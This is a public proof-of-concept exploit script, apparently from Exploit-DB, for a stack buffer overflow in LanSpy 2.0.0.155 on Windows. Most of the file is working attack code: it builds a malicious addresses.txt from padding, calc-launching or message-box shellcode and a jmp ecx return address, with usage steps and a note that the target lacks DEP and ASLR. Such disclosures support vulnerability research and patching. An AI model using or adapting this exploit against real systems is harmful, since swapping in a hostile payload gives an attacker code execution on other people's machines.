#!/usr/bin/python

### LanSpy 2.0.0.155 - Buffer Overflow Exploit by n30m1nd ###

# Date: 2016-10-18
# Exploit Author: n30m1nd
# Vendor Homepage: www.lantricks.com
# Software Link: https://www.exploit-db.com/apps/42114d0f9e88ad76acaa0f145dabf923-lanspy_setup.exe
# Version: LanSpy 2.0.0.155
# Tested on: Tested on Win7 32bit and Win10 64 bit

# Platforms
# =========
# Tested on Win7 32bit and Win10 64 bit
# This exploit should work everywhere since the binary does not implement DEP nor ASLR

# Credits
# =======
# Shouts to hyp3rlinx for the PoC:
# 	https://www.exploit-db.com/exploits/38399/
# 	http://hyp3rlinx.altervista.org/
# And shouts to the crew at Offensive Security for their huge efforts on making
#	the infosec community better

# How to
# ======
# * Run this python script. It will generate an "addresses.txt" file.
# * Replace this file in the root directory of your LanSpy.exe installation.
# * Run LanSpy.exe and start the scan or do so by pressing F3.
# 	- You can also call LanSpy.exe from the command line like the following and 
# 		it will run the exploit straight away: echo n30 | C:\Path\To\LanSpy.exe

# Exploit code
# ============

import struct

# 32bit Alphanum-ish shellcodes
# Bad chars detected: 00 2d 20

# MessageBoxA at => 00404D80
msgbox_shellcode = (
        "\x31\xC0\x50\x68"
        "\x70\x77\x6E\x64"
        "\x54\x5F\x50\x57"
        "\x57\x50\x35\xC4"
        "\x80\x80\x55\x35"
        "\x44\xCD\xC0\x55"
        "\x50\xC3"
        )

# WinExec at -> 004EC4FF
calc_shellcode = (
        "\x31\xC0\x50\x68"
        "\x63\x61\x6C\x63"
        "\x54\x5F\x50\x57"
        "\x35\xC3\x4E\xC3"
        "\x55\x35\x3C\x8A"
        "\x8D\x55\x50\xC3"
        )

# Change the shellcode to be used here
scde = calc_shellcode
#scde = msgbox_shellcode

# 126 are the bytes to jmp back with opcode \x74\x80 => ja -80h and it is where our shellcode resides
junk = 'A'*(676-126) 
if len(scde) > 126:
	exit("[e] Shellcode is too big! Egghunter maybe? ;)")

# 0040407D => jmp ecx inside LanSpy
jecx = 'A'*(126-len(scde))+'\x74\x80CC'+struct.pack('<I', 0x0040407D)

# Junk + Shellcode for calc + jump to our first stage jump which jumps to the second stage calc shellcode
payl = junk + scde + jecx

with open("addresses.txt", "wb") as f:
        f.write(payl)
        f.close()